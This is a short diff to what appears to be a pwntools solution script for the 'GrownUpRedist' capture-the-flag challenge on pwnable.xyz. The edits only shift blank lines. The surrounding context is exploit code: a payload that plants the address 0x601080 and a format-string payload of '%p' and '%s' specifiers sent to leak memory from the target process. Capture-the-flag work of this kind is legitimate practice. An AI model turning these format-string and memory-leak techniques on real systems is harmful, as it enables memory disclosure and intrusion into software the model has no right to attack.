@@ -8,6 +8,7 @@ from pwn import *
 p = process('./GrownUpRedist')
 # p = remote('svc.pwnable.xyz', 30004)
 
+
 p.recvuntil(': ')
 payload = b'y1111111' + p32(0x601080)
 p.sendline(payload)
@@ -26,5 +27,5 @@ payload = b'a'*32 +b'%p  '*8 + b'%s  ' + b'%p  '*7 + b'a'*33
 p.send(payload)
 p.recvuntil('Welcome ')
 log.info('recieved :')
-
 log.info(p.recv())
+
